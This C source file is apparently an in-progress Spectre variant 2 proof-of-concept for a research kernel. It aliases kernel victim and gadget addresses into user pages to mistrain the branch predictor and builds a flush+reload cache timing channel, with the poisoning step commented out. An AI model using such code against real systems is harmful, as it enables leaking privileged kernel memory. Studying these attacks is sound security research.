#include <stdio.h>

#include "types.h"
#include "user.h"

#include <uk/mman.h>
#include <uk/asm.h>
#include <cstring>
#include <cstdlib>
#include "amd64.h"

#define USER_MASK ((1ull << 47) - 1) // 4 level paging => 48 bit va, top bit is kernel/user
#define PAGE_BITS 12
#define PAGE_SIZE (1ull << PAGE_BITS)
#define PAGE_INDEX_MASK ~((1ull << PAGE_BITS) - 1)

// mimic the safe target
__attribute__((noinline))
int
dummy_gadget(void)
{
  return 3;
}

// mimic the victim
__attribute__((noinline))
int
dummy_victim(u64 dest)
{
  int result;
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (dest));
  result++;
  return result;
}

void *
mmap_two_pages(u64 addr)
{
  return mmap((void*) (addr & PAGE_INDEX_MASK),
              PAGE_SIZE * 2, // map 2 pages just in case we're close to boundary
              PROT_READ | PROT_WRITE,
              MAP_ANONYMOUS,
              0, 0);
}

int
main(int argc, char *argv[])
{
  printf("starting\n");
  u64 dest_addr = get_dest_addr(); // need to flush this from cache
  u64 kva = get_victim_addr(); // need to mistrain this call
  u64 kga = get_gadget_addr(); // to predict here
  int result = victim();
  printf("dest_addr: 0x%lx, kva: 0x%lx, kga: 0x%lx, result: %d\n", dest_addr, kva, kga, result);

  int kvoffset = get_victim_offset(); // offset to call instruction
  printf("kvoffset: %d\n", kvoffset);

  int uvoffset;
  u8 *code = (u8*) &dummy_victim;
  for (uvoffset = 0; *(code + uvoffset) != 0xff; uvoffset++);
  printf("uvoffset: %d\n", uvoffset);

  u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
  printf("uva: 0x%lx\n", uva);

  if (mmap_two_pages(uva) == MAP_FAILED) {
    printf("mmap uva failed\n");
    return 1;
  }

  u64 uga = kga & USER_MASK;
  printf("uga: 0x%lx\n", uga);

  if (mmap_two_pages(uga) == MAP_FAILED) {
    printf("mmap uga failed\n");
    return 1;
  }

  // 64 just has to be larger than function
  memcpy((void*) uva, (void*) &dummy_victim, 64);

  // 8 so that we don't overwrite uva
  memcpy((void*) uga, (void*) &dummy_gadget, 8);

  auto uv = ((int (*)(u64)) uva);

  result = uv(uga);
  printf("result: %d\n", result);

  // see appendix C of https://spectreattack.com/spectre.pdf
  const int GAP = 512;
  u8 *channel = (u8*) malloc(256 * GAP * sizeof(u8));
  int hits[256]; // record cache hits
  int trials, i, j, k, mix_i, junk = 0;
  u64 start, elapsed;
  volatile u8 *addr;

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 5;
  }

  for (trials = 1; trials > 0; trials--) {
    // flush side channel
    for (i = 0; i < 256; i++)
      clflush(&channel[i * GAP]);

    // flush actual target
    // flush_target();

    mfence();

    // poison branch predictor
    /*
    for (j = 5; j > 0; j--) {
      junk ^= uv(uga);
    }

    // set up registers

    // call victim
    junk ^= victim();
    */

    for (j = 5; j > 0; j--) {
      junk ^= channel[102 * GAP];
      mfence();
    }

    u64 e[256];
    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = rdtsc();
      junk ^= *addr;
      mfence();
      elapsed = rdtsc() - start;
      // printf("mix_i: %d, elapsed: %lu\n", mix_i, elapsed);
      e[mix_i] = elapsed;
    }

    for (i = 0; i < 256; i++) {
      printf("i: %d, elapsed: %lu\n", i, e[i]);
    }
  }

  printf("junk: %d\n", junk);

  return 0;
}
